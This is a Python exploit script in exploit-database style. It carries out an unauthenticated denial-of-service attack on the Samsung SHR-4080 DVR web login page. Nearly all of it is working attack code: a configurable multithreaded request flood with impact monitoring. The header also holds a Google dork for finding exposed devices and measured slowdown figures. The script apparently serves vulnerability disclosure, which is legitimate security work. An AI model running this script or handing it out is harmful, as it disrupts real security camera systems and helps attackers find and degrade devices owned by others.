#!/usr/bin/env python3
# Exploit Title: Samsung SHR-4080 DVR Web Interface - Denial of Service (Login Resource Exhaustion)
# Google Dork: intitle:"Web Viewer for DVR" "SHR-4080" | inurl:"/cgi-bin/webviewer_login_page"
# Date: 2026-11-22
# Exploit Author: David A. Mascaro
# Vendor Homepage: https://www.hanwhavision.com/
# Software Link: N/A (embedded firmware; no public download)
# Version: SHR-4080 firmware with lighttpd/1.4.35 (web UI files dated 2019-05-17)
# Tested on: Kali Linux (attacker) against Samsung SHR-4080 DVR (embedded Linux)
# CVE: N/A (Application-Layer Resource Exhaustion; no CVE assigned) Exploit 0Day

# Description:
#   The SHR-4080 web login page generates a 512-bit RSA keypair for every
#   request. A sustained, concurrent GET flood against
#   /cgi-bin/webviewer_login_page exhausts the CGI/CPU and queues the login,
#   causing multi-second latency and intermittent failures. No authentication
#   is required.
#
#   Measured on the tested device:
#     - 2000 requests / 50 workers: 44 failures (2.2%), probes 1.65-1.9s,
#       max 2.42s (baseline 0.61s).
#     - 5000 requests / 100 workers: 0 request errors, max 9.43s,
#       web '/' max 6.31s, RTSP 0.68s (baseline 0.61s); device recovered
#       immediately, no reboot/reset.

# Usage:
#   python3 shr4080_login_dos.py -t http://TARGET:8081 -w 100 -n 5000
#
# Requires only Python 3 standard library.

import argparse
import statistics
import threading
import time
import urllib.request

DEFAULT_PATH = "/cgi-bin/webviewer_login_page?lang=jp&loginvalue=0&port=4524&data3=0.5"


def fetch(url, timeout):
    start = time.time()
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            r.read()
        return time.time() - start, 0
    except Exception:
        return time.time() - start, 1


def main():
    ap = argparse.ArgumentParser(description="Samsung SHR-4080 login-page DoS")
    ap.add_argument("-t", "--target", required=True, help="e.g. http://192.0.2.10:8081")
    ap.add_argument("-w", "--workers", type=int, default=100)
    ap.add_argument("-n", "--requests", type=int, default=5000)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--no-monitor", action="store_true")
    args = ap.parse_args()

    base = args.target.rstrip("/")
    login = base + DEFAULT_PATH
    root = base + "/"

    baseline = [fetch(login, args.timeout)[0] for _ in range(3)]
    print("[*] baseline login: %s avg=%.2fs" %
          ([round(x, 2) for x in baseline], statistics.mean(baseline)))

    results = []
    lock = threading.Lock()
    queue = list(range(args.requests))
    stop = [False]
    monitor = []

    def worker():
        while True:
            with lock:
                if stop[0] or not queue:
                    return
                queue.pop()
            d, e = fetch(login, args.timeout)
            with lock:
                results.append((round(d, 2), e))
                if len(results) % 500 == 0:
                    errors = sum(1 for _, x in results if x)
                    print("[*] %d/%d requests, %d errors" %
                          (len(results), args.requests, errors), flush=True)

    def mon():
        while not stop[0]:
            d, e = fetch(root, min(5.0, args.timeout))
            monitor.append((round(d, 2), e))
            time.sleep(0.5)

    threads = [threading.Thread(target=worker) for _ in range(args.workers)]
    mt = threading.Thread(target=mon, daemon=True)
    if not args.no_monitor:
        mt.start()
    t0 = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.time() - t0
    time.sleep(1)
    stop[0] = True
    if not args.no_monitor:
        mt.join(timeout=2)

    errors = sum(1 for _, e in results if e)
    slowest = sorted(results, reverse=True)[:5]
    print("[*] burst: %.2fs, %d requests, %d errors" % (elapsed, len(results), errors))
    print("[*] slowest: %s" % slowest)
    if monitor:
        print("[*] web '/' max=%.2fs avg=%.2fs errors=%d" % (
            max(d for d, _ in monitor),
            statistics.mean([d for d, _ in monitor]),
            sum(e for _, e in monitor)))
    print("[*] impact: admin login page is queued/degraded under this load")
    print("[*] no credentials required")


if __name__ == "__main__":
    main()